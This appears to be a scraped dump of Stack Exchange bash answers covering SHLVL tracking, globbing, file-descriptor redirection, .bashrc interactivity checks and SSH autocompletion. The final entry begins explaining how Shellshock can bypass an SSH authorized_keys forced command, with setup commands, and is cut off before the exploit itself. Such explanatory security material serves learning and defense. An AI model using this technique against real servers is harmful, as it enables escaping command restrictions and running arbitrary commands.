If you don’t mind tying up a bit of memory and a process slot
(and to seeing one more shell process than you need when you do a <code>ps</code>),
then do the above and skip to the next section. 
Ditto if you’re using a shell that doesn’t keep the extra process lying around. 
But, if you want to avoid the extra process, a first thing to try is</p>

<pre><code>vim()  { ( ((SHLVL++)); exec vim  ""$@"");}
</code></pre>

<p>The <code>exec</code> command is there to prevent the extra shell process from lingering.</p>

<p>But, there’s a gotcha. 
The shell’s handling of <code>SHLVL</code> is somewhat intuitive:
When the shell starts, it checks whether <code>SHLVL</code> is set. 
If it’s not set (or set to something other than a number),
the shell sets it to 1. 
If it is set (to a number), the shell adds 1 to it.</p>

<p>But, by this logic, if you say <code>exec sh</code>, your <code>SHLVL</code> should go up. 
But that’s undesirable, because your real shell level hasn’t increased. 
The shell handles this by <strong><em>subtracting one</strong> from</em> <code>SHLVL</code>
when you do an <code>exec</code>:</p>

<pre><code>$ echo ""$SHLVL""
1

$ set | grep SHLVL
SHLVL=1

$ env | grep SHLVL
SHLVL=1

$ (env | grep SHLVL)
SHLVL=1

$ (env) | grep SHLVL
SHLVL=1

$ (exec env) | grep SHLVL
SHLVL=0
</code></pre>

<p>So</p>

<pre><code>vim()  { ( ((SHLVL++)); exec vim  ""$@"");}
</code></pre>

<p>is a wash; it increments <code>SHLVL</code> only to decrement it again.
You might as well just say <code>vim</code>, without benefit of a function.</p>

<blockquote>
  <p><strong>Note:</strong><br>
  <a href=""https://unix.stackexchange.com/q/373704/23408#373710"">According to Stéphane Chazelas (who knows everything)</a>,
  some shells are smart enough <em>not</em> to do this if the <code>exec</code> is in a subshell.</p>
</blockquote>

<p>To fix this, you would do</p>

<pre><code>vim()  { ( ((SHLVL+=2)); exec vim  ""$@"");}
</code></pre>

<hr>

<p>Then I saw that you wanted to count <code>vim</code> levels
<strong><em>independently of</em></strong> shell levels. 
Well, the exact same trick works (well, with a minor modification):</p>

<pre><code>vim() { ( ((SHLVL++, VILVL++)); export VILVL; exec vim ""$@"");}
</code></pre>

<p>(and so on for <code>vi</code>, <code>view</code>, etc.) 
The <code>export</code> is necessary
because <code>VILVL</code> isn’t defined as an environment variable by default. 
But it doesn’t need to be part of the function;
you can just say <code>export VILVL</code> as a separate command (in your <code>.bashrc</code>). 
And, as discussed above, if the extra shell process isn’t an issue for you,
you can do <code>command vim</code> instead of <code>exec vim</code>, and leave <code>SHLVL</code> alone: </p>

<pre><code>vim() { ( ((VILVL++)); command vim ""$@"");}
</code></pre>

<blockquote>
  <p><strong>Personal Preference:</strong><br>
  You may want to rename <code>VILVL</code> to something like <code>VIM_LEVEL</code>. 
  When I look at “<code>VILVL</code>”, my eyes hurt;
  they can’t tell whether it’s a misspelling of “vinyl”
  or a malformed Roman numeral.</p>
</blockquote>

<hr>

<p>If you are using a shell that doesn’t support <code>SHLVL</code> (e.g., dash),
you can implement it yourself as long as the shell implements a startup file. 
Just do something like</p>

<pre><code>if [ ""$SHELL_LEVEL"" = """" ]
then
    SHELL_LEVEL=1
else
    SHELL_LEVEL=$(expr ""$SHELL_LEVEL"" + 1)
fi
export SHELL_LEVEL
</code></pre>

<p>in your <code>.profile</code> or applicable file. 
(You should probably not use the name <code>SHLVL</code>, as that will cause chaos
if you ever start using a shell that supports <code>SHLVL</code>.)</p>

<hr>

<p>Other answers have addressed the issue
of embedding environment variable value(s) into your shell prompt,
so I won’t repeat that, especially you say you already know how to do it.</p>
"
"Exclude one pattern from glob match","164025","<bash><wildcards>","74","<pre><code>shopt -s extglob
echo rm foo.!(org)
</code></pre>

<p>This is ""foo."" followed by anything NOT ""org""</p>

<p>ref: <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Pattern-Matching"">https://www.gnu.org/software/bash/manual/bashref.html#Pattern-Matching</a></p>
"
"How to read first and last line from cat output?","139089","<bash><shell><sed><awk><grep>","74","<p><strong>sed</strong> Solution:</p>

<pre><code>sed -e 1b -e '$!d' file
</code></pre>

<p>When reading from <code>stdin</code> if would look like this (for example <code>ps -ef</code>):</p>

<pre><code>ps -ef | sed -e 1b -e '$!d'
UID        PID  PPID  C STIME TTY          TIME CMD
root      1931  1837  0 20:05 pts/0    00:00:00 sed -e 1b -e $!d
</code></pre>

<p><strong>head &amp; tail</strong> Solution:</p>

<pre><code>(head -n1 &amp;&amp; tail -n1) &lt;file
</code></pre>

<p>When data is coming from a command (<code>ps -ef</code>):</p>

<pre><code>ps -ef 2&gt;&amp;1 | (head -n1 &amp;&amp; tail -n1)
UID        PID  PPID  C STIME TTY          TIME CMD
root      2068  1837  0 20:13 pts/0    00:00:00 -bash
</code></pre>

<p><strong>awk</strong> Solution:</p>

<pre><code>awk 'NR==1; END{print}' file
</code></pre>

<p>And also the piped example with <code>ps -ef</code>:</p>

<pre><code>ps -ef | awk 'NR==1; END{print}'
UID        PID  PPID  C STIME TTY          TIME CMD
root      1935  1837  0 20:07 pts/0    00:00:00 awk NR==1; END{print}
</code></pre>
"
"Kill all background jobs","43527","<bash>","74","<p>To just <code>kill</code> all background jobs managed by <code>bash</code>, do</p>

<pre><code>kill $(jobs -p)
</code></pre>

<p>Note that since both <code>jobs</code> and <code>kill</code> are built into <code>bash</code>, you shouldn't run into any errors of the <em>Argument list too long</em> type.</p>
"
"What does ""3>&1 1>&2 2>&3"" do in a script?","42728","<bash><shell><io-redirection><file-descriptors>","74","<p>The numbers are file descriptors and only the first three (starting with zero) have a standardized meaning:</p>

<pre><code>0 - stdin
1 - stdout
2 - stderr
</code></pre>

<p>So each of these numbers in your command refer to a file descriptor. You can either redirect a file descriptor to a file with <code>&gt;</code> or redirect it to another file descriptor with <code>&gt;&amp;</code></p>

<p>The <code>3&gt;&amp;1</code> in your command line will create a new file descriptor and redirect it to <code>1</code> which is <code>STDOUT</code>.  Now <code>1&gt;&amp;2</code> will redirect the file descriptor 1 to <code>STDERR</code> and <code>2&gt;&amp;3</code> will redirect file descriptor 2 to 3 which is <code>STDOUT</code>.</p>

<p>So basically you switched <code>STDOUT</code> and <code>STDERR</code>, these are the steps:</p>

<ol>
<li>Create a new fd 3 and point it to the fd 1</li>
<li>Redirect file descriptor 1 to file descriptor 2. If we wouldn't have saved the file descriptor in 3 we would lose the target.</li>
<li>Redirect file descriptor 2 to file descriptor 3. Now file descriptors one and two are switched.</li>
</ol>

<p>Now if the program prints something to the file descriptor 1, it will be printed to the file descriptor 2 and vice versa.</p>
"
"How to avoid the need to issue ""y"" several times when removing protected file","72864","<bash><command-line><rm>","73","<p><strong>Edit based on updated question:</strong></p>

<p>To avoid being asked about removing files, add the <code>-f</code> (""force"") option:</p>

<pre><code>rm -f /path/to/file
</code></pre>

<p>This has one side effect you should be aware of: If any of the given paths do not exist, it will <em>not</em> report this, and it will return successfully:</p>

<pre><code>$ rm -f /nonexistent/path
$ echo $?
0
</code></pre>

<hr>

<p>Original answer:</p>

<p>Here's one simple solution:</p>

<pre><code>yes ""$string"" | head -n $number | tr $'\n' $'\r'
</code></pre>

<p><code>yes</code> repeats any string you give it infinitely, separated by newlines. <code>head</code> stops it after <code>$number</code> times, and <code>tr</code> translates the newlines to carriage returns. You might not see any output because of the carriage returns, but passing it to this command (in <code>bash</code>) should illustrate it:</p>

<pre><code>printf %q ""$(yes ""$string"" | head -n $number | tr $'\n' $'\r')""
</code></pre>

<p>Users without <code>bash</code> can pipe the result to <code>od</code>, <code>hexdump</code> or <code>xxd</code> to see the actual characters returned.</p>
"
"What is the difference between ~/.profile, ~/.bashrc, ~/.bash_profile, ~/.gnomerc, /etc/bash_bashrc, /etc/screenrc ...?","40708","<bash><environment-variables><profile><settings><bashrc>","73","<p>The organization of configuration files is much less uniform than your questions seem to imply.  There is no ""class"", there is no ""hierarchy"", and there is no global ""configuration czar"" nor committee that decrees a common syntax or other nice clean generalizations like the ones you are seeking.  There is only a multitude of separate applications like <code>R</code>, <code>bash</code>, <code>screen</code> and the GNOME desktop environment, all of whom have their own ways of doing things, so you should look at the documentation for each  individual program to answer any <em>specific</em> questions about a particular file.  If it seems ad-hoc, that's because it is: most of Unix / Linux software out there was developed for different purposes by different people who all went about configuration slightly differently.</p>

<p>To answer your other questions pointwise:</p>

<ul>
<li><p><code>*rc</code> and <code>*profile</code> do not mean very much, so this question can't really be answered.  ""rc"" is merely a commonly used abbreviation or suffix for configuration files.  Its etymology goes back to ancient times (in computer years), and probably means run commands (from <a href=""https://en.wikipedia.org/wiki/Run_commands"">runcom</a>).  Just because applications use the same word does not mean they agree on conventions.  ""profile"" is a much less common suffix.</p></li>
<li><p>Define ""scope"".  Most applications do not share configuration files with other non-related applications.  The one possible exception is <code>/etc/profile</code> and <code>.profile</code>, which may be used by multiple different shells (including at least <code>sh</code> and <code>bash</code>).  There is something called an <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html"">environment</a> associated with every running process which can contain variables that may affect the behavior of said process.  Generally, environment variables are set by the appropriate shell configuration files, or perhaps the configuration files of whatever graphical desktop environment you are using.  There are also configuration files for ""libraries"", like <code>.inputrc</code> for readline and <code>.gtkrc*</code> for GTK, which will affect every application that uses the library.  </p></li>
<li><p>No, there is no global hierarchy for configuration files.  Again, refer to the documentation for the specific program in question, for example, the <a href=""http://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html#Bash-Startup-Files""><code>bash</code> manual</a> for <code>bash</code>.  A general convention you can usually rely on is that user settings in <code>$HOME</code> override system-wide configuration in <code>/etc</code>.  This is typically accomplished by reading the user file after the system one, so that later settings overwrite earlier ones.  However, this is not a guarantee, and for definitive answers you should refer to the documentation for the specific program you are using.</p></li>
<li><p>There is no ""class"", at least none general enough to encompass all the files you've listed in your question, so the question of a reference for such a ""class"" is moot.  Again, refer to the documentation of the specific program you are using.</p></li>
</ul>
"
"Why is my bash prompt getting bugged when I browse the history?","28827","<bash><command-history><prompt>","73","<p>Use <code>\[...\]</code> around the parts of PS1 that have length 0. It helps bash to get the length of the prompt right. Even with this measure, your command line can get spoiled when using multibyte characters (at least mine does). Hitting <kbd>Ctrl+L</kbd> also helps in such cases (but clears the screen at the same time).</p>
"
"bash: test if $WORD is in set","111508","<bash><shell-script>","72","<p>This is a Bash-only (>= version 3) solution that uses regular expressions:</p>

<pre><code>if [[ ""$WORD"" =~ ^(cat|dog|horse)$ ]]; then
    echo ""$WORD is in the list""
else
    echo ""$WORD is not in the list""
fi
</code></pre>

<p>If your word list is long, you can store it in a file (one word per line) and do this:</p>

<pre><code>if [[ ""$WORD"" =~ $(echo ^\($(paste -sd'|' /your/file)\)$) ]]; then
    echo ""$WORD is in the list""
else
    echo ""$WORD is not in the list""
fi
</code></pre>

<p>One caveat with the file approach:</p>

<ul>
<li><p>It will break if the file has whitespace. This can be remedied by something like:</p>

<pre><code>sed 's/[[:blank:]]//g' /your/file | paste -sd '|' /dev/stdin
</code></pre></li>
</ul>

<p>Thanks to @terdon for reminding me to properly anchor the pattern with <code>^</code> and <code>$</code>.</p>
"
"Autocomplete server names for SSH and SCP","136351","<bash><ssh><autocomplete><scp>","72","<p><strong>Found it!!</strong></p>

<p>It seems that in Ubuntu <a href=""https://bugs.launchpad.net/ubuntu/+source/bash/+bug/42382"" rel=""noreferrer"">the entries in <code>~/.ssh/known_hosts</code> are hashed</a>, so SSH completion cannot read them. This is a feature, not a bug. Even by adding <code>HashKnownHosts no</code> to <code>~/.ssh/config</code> and <code>/etc/ssh/ssh_config</code> I was unable to prevent the host hashing.</p>

<p>However, the hosts that I am interested in are also found in <code>~/.ssh/config</code>. Here is a script for Bash Completion that reads the entries from that file:</p>

<pre><code>_ssh() 
{
    local cur prev opts
    COMPREPLY=()
    cur=""${COMP_WORDS[COMP_CWORD]}""
    prev=""${COMP_WORDS[COMP_CWORD-1]}""
    opts=$(grep '^Host' ~/.ssh/config ~/.ssh/config.d/* 2&gt;/dev/null | grep -v '[?*]' | cut -d ' ' -f 2-)

    COMPREPLY=( $(compgen -W ""$opts"" -- ${cur}) )
    return 0
}
complete -F _ssh ssh
</code></pre>

<p>Put that script in <code>/etc/bash_completion.d/ssh</code> and then source it with the following command:</p>

<pre><code>$ . /etc/bash_completion.d/ssh
</code></pre>

<p>I found <a href=""http://www.debian-administration.org/article/317/An_introduction_to_bash_completion_part_2"" rel=""noreferrer"">this guide</a> invaluable and I would not have been able to script this without it. Thank you <a href=""http://www.steve.org.uk/"" rel=""noreferrer"">Steve Kemp </a> for writing that terrific guide!</p>
"
"put history command onto command line without executing it","4079","<command-line><bash><command-history>","72","<p>To request that the command be printed rather than executed after history substitution, add the <code>:p</code> <a href=""http://www.gnu.org/software/bash/manual/bash.html#Modifiers"">modifier</a>, e.g. <code>!42:p</code>. The resulting command will also be entered in the history, so you can press <kbd>Up</kbd> to edit it.</p>

<p>If you have the <code>histverify</code> <a href=""http://www.gnu.org/software/bash/manual/bash.html#Modifying-Shell-Behavior"">option</a> set (<code>shopt -s histverify</code>), you will always have the opportunity to edit the result of history substitutions.</p>

<p>The <a href=""http://www.gnu.org/software/bash/manual/bash.html#Bash-History-Builtins""><code>fc</code> builtin</a> gives limited access to history expansion (no word designators), and lets you edit a previous command in an external editor.</p>

<p>You can use <code>!prefix</code> to refer to the last command beginning with <code>prefix</code>, and <code>!?substring</code> to refer to the last command beginning with <code>substring</code>. When you know what you're looking for, this can save a lot of time over <code>history | less</code>.</p>

<p>Another way to search through previous history is incremental search: press <kbd>Ctrl</kbd>+<kbd>R</kbd> and start entering a substring of what you're looking for. Press <kbd>Ctrl</kbd>+<kbd>R</kbd> to go to the previous occurence of the search string so far and <kbd>Ctrl</kbd>+<kbd>S</kbd> if you've gone too far. Most keys other than <kbd>Ctrl</kbd>+<kbd>R</kbd>, <kbd>Ctrl</kbd>+<kbd>S</kbd>, <kbd>Backspace</kbd> and ordinary characters terminate the incremental search and have their usual effect (e.g. arrow keys to move the cursor in the line you've reached, <kbd>Enter</kbd> to run the command).</p>
"
"Why does bashrc check whether the current shell is interactive?","257571","<bash><bashrc>","72","<p>This is a question that I was going to post here a few weeks ago. Like <em>terdon</em>, I understood that a <code>.bashrc</code> is only sourced for interactive Bash shells so there should be no need for <code>.bashrc</code> to check if it is running in an interactive shell. Confusingly, <strong>all</strong> the distributions I use (Ubuntu, RHEL and Cygwin) had some type of check (testing <code>$-</code> or <code>$PS1</code>) to ensure the current shell is interactive.  I don’t like <a href=""http://www.catb.org/jargon/html/C/cargo-cult-programming.html"" rel=""noreferrer"">cargo cult programming</a> so I set about understanding the purpose of this code in my <code>.bashrc</code>.</p>

<h2>Bash has a special case for remote shells</h2>

<p>After researching the issue, I discovered that <em>remote shells</em> are treated differently. While non-interactive Bash shells don’t normally run <code>~/.bashrc</code> commands at start-up, a special case is made when the shell is <a href=""https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html"" rel=""noreferrer"">Invoked by remote shell daemon</a>:</p>

<blockquote>
  <p>Bash attempts to determine when it is being run with its standard input
  connected to a network connection, as when executed by the remote shell
  daemon, usually <code>rshd</code>, or the secure shell daemon <code>sshd</code>. If Bash
  determines it is being run in this fashion, it reads and executes commands
  from ~/.bashrc, if that file exists and is readable. It will not do this if
  invoked as <code>sh</code>.  The <code>--norc</code> option may be used to inhibit this behavior,
  and the <code>--rcfile</code> option may be used to force another file to be read, but
  neither <code>rshd</code> nor <code>sshd</code> generally invoke the shell with those options or
  allow them to be specified.</p>
</blockquote>

<h3>Example</h3>

<p>Insert the following at the start of a remote <code>.bashrc</code>. (If <code>.bashrc</code> is sourced by <code>.profile</code> or <code>.bash_profile</code>, temporarily disable this while testing):</p>

<pre><code>echo bashrc
fun()
{
    echo functions work
}
</code></pre>

<p>Run the following commands locally:</p>

<pre><code>$ ssh remote_host 'echo $- $0'
bashrc
hBc bash
</code></pre>

<ul>
<li>No <code>i</code> in <code>$-</code> indicates that the shell is <em>non-interactive</em>.</li>
<li>No leading <code>-</code> in <code>$0</code> indicates that the shell is not a <em>login shell</em>.</li>
</ul>

<p>Shell functions defined in the remote <code>.bashrc</code> can also be run:</p>

<pre><code>$ ssh remote_host fun
bashrc
functions work
</code></pre>

<p>I noticed that the <code>~/.bashrc</code> is <em>only</em> sourced when a command is specified as the argument for <code>ssh</code>. This makes sense: when <code>ssh</code> is used to start a regular login shell, <code>.profile</code> or <code>.bash_profile</code> are run (and <code>.bashrc</code> is only sourced if explicitly done so by one of these files).</p>

<p>The main benefit I can see to having <code>.bashrc</code> sourced when running a (non-interactive) remote command is that shell functions can be run. However, most of the commands in a typical <code>.bashrc</code> are only relevant in an interactive shell, e.g., aliases aren’t expanded unless the shell is interactive.</p>

<h2>Remote file transfers can fail</h2>

<p>This isn’t usually a problem when <code>rsh</code> or <code>ssh</code> are used to start an interactive login shell or when non-interactive shells are used to run commands. However, it <em>can be a problem</em> for programs such as <code>rcp</code>, <code>scp</code> and <code>sftp</code> that use <em>remote shells</em> for transferring data.</p>

<p>It turns out that the remote user’s default shell (like Bash) is implicitly started when using the <code>scp</code> command. There’s no mention of this in the man page – only a mention that <code>scp</code> uses <code>ssh</code> for its data transfer.  This has the consequence that <strong>if the <code>.bashrc</code> contains any commands that print to standard output, file transfers will fail</strong>, e.g, 
<a href=""https://unix.stackexchange.com/questions/18231/scp-fails-without-error/18647#18647"">scp fails without error</a>.</p>

<p>See also this related Red Hat bug report from 15 years ago, <a href=""https://bugzilla.redhat.com/show_bug.cgi?id=20527"" rel=""noreferrer"">scp breaks when there's an echo command in /etc/bashrc</a> (which was eventually closed as <code>WONTFIX</code>).</p>

<h2>Why <code>scp</code> and <code>sftp</code> fail</h2>

<p><a href=""https://en.wikipedia.org/wiki/Secure_copy"" rel=""noreferrer"">SCP (Secure copy)</a> and <a href=""https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol"" rel=""noreferrer"">SFTP (Secure File Transfer Protocol)</a> have their own protocols for the local and remote ends to exchange information about the file(s) being transferred. Any unexpected text from the remote end is (wrongly) interpreted as part of the protocol and the transfer fails.  According to a <a href=""http://www.snailbook.com/faq/sftp-corruption.auto.html"" rel=""noreferrer"">FAQ from the Snail Book</a></p>

<blockquote>
  <p>What often happens, though, is that there are statements in either the
  system or per-user shell startup files on the server (<code>.bashrc</code>, <code>.profile</code>,
  <code>/etc/csh.cshrc</code>, <code>.login</code>, etc.) which output text messages on login,
  intended to be read by humans (like <code>fortune</code>, <code>echo ""Hi there!""</code>, etc.).</p>
  
  <p>Such code should only produce output on interactive logins, when there is a
  <code>tty</code> attached to standard input. If it does not make this test, it will
  insert these text messages where they don't belong: in this case, polluting
  the protocol stream between <code>scp2</code>/<code>sftp</code> and <code>sftp-server</code>.</p>
  
  <p>The reason the shell startup files are relevant at all, is that <strong><code>sshd</code>
  employs the user's shell when starting any programs on the user's behalf</strong>
  (using e.g.  /bin/sh -c ""command""). This is a Unix tradition, and has
  advantages:</p>
  
  <ul>
  <li>The user's usual setup (command aliases, environment variables, umask,
  etc.) are in effect when remote commands are run.</li>
  <li>The common practice of setting an account's shell to /bin/false to disable
  it will prevent the owner from running any commands, should authentication
  still accidentally succeed for some reason.</li>
  </ul>
</blockquote>

<h3>SCP protocol details</h3>

<p>For those interested in the details of how SCP works, I found interesting information in <a href=""https://blogs.oracle.com/janp/entry/how_the_scp_protocol_works"" rel=""noreferrer"">How the SCP protocol works</a> which includes details on <strong>Running scp with talkative shell profiles on the remote side?</strong>:</p>

<blockquote>
  <p>For example, this can happen if you add this to your shell profile on the
  remote system:</p>
  
  <p>echo """"</p>
  
  <p>Why it just hangs? That comes from the way how <code>scp</code> in <strong>source</strong> mode
  waits for the confirmation of the first protocol message. If it's not binary
  0, it expects that it's a notification of a remote problem and waits for
  more characters to form an error message until the new line arrives. Since
  you didn't print another new line after the first one, your local <code>scp</code> just
  stays in a loop, blocked on <code>read(2)</code>. In the meantime, after the shell
  profile was processed on the remote side, <code>scp</code> in sink mode was started,
  which also blocks on <code>read(2)</code>, waiting for a binary zero denoting the start
  of the data transfer.</p>
</blockquote>

<h1>Conclusion / TLDR</h1>

<p>Most of the statements in a typical <code>.bashrc</code> are only useful for an interactive shell – not when running remote commands with <code>rsh</code> or <code>ssh</code>. In most such situations, setting shell variables, aliases and defining functions isn’t desired – and printing <em>any text</em> to standard out is actively harmful if transferring files using programs such as <code>scp</code> or <code>sftp</code>. Exiting after verifying that the current shell is non-interactive is the safest behaviour for <code>.bashrc</code>.</p>
"
"Set a network range in the no_proxy environment variable","23452","<bash><wget><curl><http-proxy>","71","<p>You're looking at it the wrong way. The <code>no_proxy</code> environment variable lists the domain suffixes, not the prefixes. From <a href=""http://www.gnu.org/software/wget/manual/html_node/Proxies.html"">the documentation</a>:</p>

<blockquote>
  <p><code>no_proxy</code>: This variable should contain a comma-separated list of domain extensions proxy should <em>not</em> be used for.</p>
</blockquote>

<p>So for IPs, you have two options:</p>

<p>1) Add each IP in full:</p>

<pre><code>printf -v no_proxy '%s,' 10.1.{1..255}.{1..255};
export no_proxy=""${no_proxy%,}"";
</code></pre>

<p>2) Rename <code>wget</code> to <code>wget-original</code> and write a wrapper script (called <code>wget</code>) that looks up the IP for the given URL's host, and determines if it should use the proxy or not:</p>

<pre><code>#!/bin/bash
ip='';
for arg; do
   # parse arg; if it's a URL, determine the IP address
done;
if [[ ""$ip"" =~ ^10\.1\. ]]; then
   wget-original --no-proxy ""$@"";
else
   wget-original ""$@"";
fi;
</code></pre>
"
"Use & (ampersand) in single line bash loop","91684","<bash><shell-script><command-line><process>","71","<p>Drop the <code>;</code> after <code>&amp;</code>. This is a <a href=""http://mywiki.wooledge.org/BashSheet"">syntactic requirement</a></p>

<pre><code>for((i=114;i&lt;=255;i+=1)); do echo $i &gt; numbers.txt;python DoMyScript.py &amp; done
</code></pre>
"
"How to measure time of program execution and store that inside a variable","12068","<bash><shell-script><time>","71","<p>To get the output of <code>time</code> into a var use the following:</p>

<pre><code>usr@srv $ mytime=""$(time ( ls ) 2&gt;&amp;1 1&gt;/dev/null )""
usr@srv $ echo ""$mytime""

real    0m0.006s
user    0m0.001s
sys     0m0.005s
</code></pre>

<p>You can also just ask for a single time type, e.g. utime:</p>

<pre><code>usr@srv $ utime=""$( TIMEFORMAT='%lU';time ( ls ) 2&gt;&amp;1 1&gt;/dev/null )""
usr@srv $ echo ""$utime""
0m0.000s
</code></pre>

<p>To get the time you can also use <code>date +%s.%N</code>, so take it before and after execution and calculate the diff:</p>

<pre><code>START=$(date +%s.%N)
command
END=$(date +%s.%N)
DIFF=$(echo ""$END - $START"" | bc)
# echo $DIFF
</code></pre>
"
"cron ignores variables defined in "".bashrc"" and "".bash_profile""","67940","<bash><cron>","70","<p>You can source the file you want at the top of the script or beginning of the job for the user that is executing the job. The ""source"" command is a built-in. You'd do the same thing if you made edits to those files to load the changes.</p>

<pre><code>* * * * * source /home/user/.bash_profile; &lt;command&gt;
</code></pre>

<p>or</p>

<pre><code>#!/bin/bash
source /home/user/.bash_profile

&lt;commands&gt;
</code></pre>
"
"Why write an entire bash script in functions?","313256","<bash><shell-script><function>","69","<p>I've started using this same style of bash programming after reading <a href=""http://kfirlavi.herokuapp.com/blog/2012/11/14/defensive-bash-programming/"" rel=""noreferrer"">Kfir Lavi's blog post ""Defensive Bash Programming""</a>. He gives quite a few good reasons, but personally I find these the most important:</p>

<ul>
<li><p>procedures become descriptive: it's much easier to figure out what a particular part of code is supposed to do.  Instead of wall of code, you see ""Oh, the <code>find_log_errors</code> function reads that log file for errors "". Compare it with finding whole lot of awk/grep/sed lines that use god knows what type of regex in the middle of a lengthy script - you've no idea what's it doing there unless there's comments.</p></li>
<li><p>you can debug functions by enclosing into <code>set -x</code> and <code>set +x</code>. Once you know the rest of the code works alright , you can use this trick to focus on debugging only that specific function. Sure, you can enclose parts of script, but what if it's a lengthy portion ? It's easier to do something like this:</p>

<pre><code> set -x
 parse_process_list
 set +x
</code></pre></li>
<li><p>printing usage with <code>cat &lt;&lt;- EOF . . . EOF</code>. I've used it quite a few times to make my code much more professional. In addition, <code>parse_args()</code> with <code>getopts</code> function is quite convenient. Again, this helps with readability, instead of shoving everything into script as giant wall of text. It's also convenient to reuse these.</p></li>
</ul>

<p>And obviously, this is much more readable for someone who knows C or Java, or Vala, but has limited bash experience. As far as efficiency goes, there's not a lot of what you can do - bash itself isn't the most efficient language and people prefer perl and python when it comes to speed and efficiency. However, you can <code>nice</code> a function:</p>

<pre><code>nice -10 resource_hungry_function
</code></pre>

<p>Compared to calling nice on each and every line of code, this decreases whole lot of typing AND can be conveniently used when you want only a part of your script to run with lower priority.</p>

<p>Running functions in background, in my opinion, also helps when you want to have whole bunch of statements to run in background.</p>

<p>Some of the examples where I've used this style:</p>

<ul>
<li><a href=""https://askubuntu.com/a/758339/295286"">https://askubuntu.com/a/758339/295286</a></li>
<li><a href=""https://askubuntu.com/a/788654/295286"">https://askubuntu.com/a/788654/295286</a></li>
<li><a href=""https://github.com/SergKolo/sergrep/blob/master/chgreeterbg.sh"" rel=""noreferrer"">https://github.com/SergKolo/sergrep/blob/master/chgreeterbg.sh</a></li>
</ul>
"
"Concatenating two variables with an underscore","88452","<bash><shell-script>","69","<p>You can use something like this:</p>

<pre><code>NAME=$(echo ${FILENAME}_${EXTENSION})
</code></pre>

<p>This works as well:</p>

<pre><code>NAME=${FILENAME}_${EXTENSION}
</code></pre>
"
"Is there a way to make ""mv"" fail silently?","87605","<bash><mv>","69","<p>Are you looking for this? </p>

<pre><code>$ mv  file dir/
mv: cannot stat ‘file’: No such file or directory
$ mv  file dir/ 2&gt;/dev/null
# &lt;---- Silent -----&gt;
</code></pre>
"
"Restart bash from terminal without restarting the terminal application (mac)?","217905","<bash><shell>","68","<p><code>exec bash</code> should replace the current shell process with (a new instance of) bash.</p>
"
"How can I get bash to exit on backtick failure in a similar way to pipefail?","23026","<bash><shell-script>","68","
<h3>Solution</h3>
<p>If you are running <a href=""https://lwn.net/Articles/700982/#azk13321_leaderboard:%7E:text=inherit_errexit"" rel=""nofollow noreferrer"">Bash 4.4 or later</a>, you can use <a href=""https://www.gnu.org/software/bash/manual/html_node/The-Shopt-Builtin.html#:%7E:text=inherit_errexit"" rel=""nofollow noreferrer"">the <code>shopt</code> option <code>inherit_errexit</code></a> to do just that. You can check compatibility from within Bash using <code>echo $BASH_VERSION</code>.</p>
<p>Here is the <a href=""https://bash.cyberciti.biz/guide/Shebang"" rel=""nofollow noreferrer"">shebang</a> you would use if Bash 4.4 or later were installed and <a href=""https://web.archive.org/web/20140925140830id_/http://teaching.idallen.com/cst8207/13w/notes/400_search_path.html#searching-for-command-names-in-path"" rel=""nofollow noreferrer"">came before <code>/bin</code> in your <code>$PATH</code></a>:</p>
<pre class=""lang-bash prettyprint-override""><code>#!/usr/bin/env -S bash -euET -o pipefail -O inherit_errexit
</code></pre>
<p>The <code>-S</code> is there to coax Linux’s <code>env</code> into accepting more than one argument for <code>bash</code>, as kindly pointed out by <a href=""/users/55407/uvv"">@UVV</a> and explained further <a href=""https://stackoverflow.com/questions/4303128/how-to-use-multiple-arguments-for-awk-with-a-shebang-i-e#52979955"">on StackOverflow</a>.</p>
<hr />
<h3>Background</h3>
<p><code>inherit_errexit</code> is an option to <code>shopt</code>, while the rest of the arguments are options to <code>set</code>. In most modern iterations, they can be passed directly to <code>bash</code> when invoking the shell.</p>
<p>Let’s review the options you have already been using:</p>
<ul>
<li><code>-u</code>/<code>-o nounset</code>, as the name ambiguously hints, disallows dereferencing of variables that have not been set; e.g., <code>$IJUSTMADETHISUP</code>.</li>
<li><code>-e</code>/<code>-o errexit</code> does <em>some</em> of what you are requesting: it causes directly called shell commands with nonzero return values to cause the shell to exit entirely.</li>
<li><code>-o pipefail</code> is needed to extend this to commands whose output is redirected with an I/O pipe <code>|</code>.</li>
</ul>
<p>Now for the options I’ve added:</p>
<ul>
<li><code>-O inherit_errexit</code> further extends this functionality (exiting on nonzero status code) to commands called from within subshells <code>$(...)</code>.</li>
<li>The <code>-E</code>/<code>-o errtrace</code> and <code>-T</code>/<code>-o functrace</code> options are there for the comparatively rare case that you use <code>trap</code> to perform an action when the shell receives a signal. These two options extend signal handlers to the inner bodies of shell functions for <code>ERR</code> signals and <code>DEBUG</code>/<code>RETURN</code> signals, respectively.</li>
</ul>
<hr />
<h3>See also</h3>
<ul>
<li>Doug Richardson: <a href=""https://dougrichardson.us/2018/08/03/fail-fast-bash-scripting.html"" rel=""nofollow noreferrer"">Fail Fast Bash Scripting</a></li>
<li>Unix &amp; Linux Stack Exchange: <a href=""https://unix.stackexchange.com/questions/541682/command-substitution-inside-a-function-does-not-stop-the-script-on-a-failure-eve#comments-541682"">Command substitution inside a function does not stop the script on a failure even if -e is set</a></li>
</ul>
"
"how can shellshock be exploited over SSH?","157477","<bash><ssh><shellshock>","68","<p>One example where this can be exploited is on servers with an <code>authorized_keys</code> forced command. When adding an entry to <code>~/.ssh/authorized_keys</code>, you can prefix the line with <code>command=""foo""</code> to force <code>foo</code> to be run any time that ssh public key is used. With this exploit, if the target user's shell is set to <code>bash</code>, they can take advantage of the exploit to run things other than the command that they are forced to.</p>

<p>This would probably make more sense in example, so here is an example:</p>

<pre><code>sudo useradd -d /testuser -s /bin/bash testuser
sudo mkdir -p /testuser/.ssh
sudo sh -c ""echo command=\\\""echo starting sleep; sleep 1\\\"" $(cat ~/.ssh/id_rsa.pub) &gt; /testuser/.ssh/authorized_keys""
sudo chown -R testuser /testuser
</code></pre>

<p>Here we set up a user <code>testuser</code>, that forces any ssh connections using your ssh key to run <code>echo starting sleep; sleep 1</code>.</p>

<p>We can test this with:</p>

<pre><code>$ ssh testuser@localhost echo something else
starting sleep
</code></pre>

<p>Notice how our <code>echo something else</code> doesn't get run, but the <code>starting sleep</code> shows that the forced command did run.</p>

<p>Now lets show how this exploit can be used:</p>

